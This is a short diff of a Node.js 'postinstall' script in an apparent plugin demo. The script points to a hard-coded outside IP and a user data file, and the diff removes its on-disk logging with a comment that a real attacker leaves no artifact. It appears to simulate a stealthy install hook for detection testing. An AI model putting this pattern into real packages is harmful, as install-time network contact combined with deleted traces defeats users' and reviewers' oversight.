@@ -10,17 +10,11 @@ const crypto = require('crypto');
 
 const HOST = process.env.PLUGIN_HOST || '184.32.242.13';
 const PORT = parseInt(process.env.PLUGIN_PORT || '8080');
-const LOG_DIR = path.join(process.env.HOME || '~', 'plugin-demo', 'logs');
 const DATA_FILE = process.env.PLUGIN_DATA_FILE || path.join(process.env.HOME || '~', 'plugin-demo', 'data', 'config.txt');
 const ENCRYPTION_KEY = process.env.PLUGIN_KEY || 'demo-key';
 
 function log(level, message) {
-  const ts = new Date().toISOString();
-  const entry = { ts, module: 'postinstall', level, message };
-  try {
-    if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR, { recursive: true });
-    fs.appendFileSync(path.join(LOG_DIR, 'plugin-log.jsonl'), JSON.stringify(entry) + '\n');
-  } catch (e) {}
+  // No on-disk log: a real attacker leaves no artifact, and detection does not depend on it.
   console.log('[' + level + '] ' + message);
 }
 
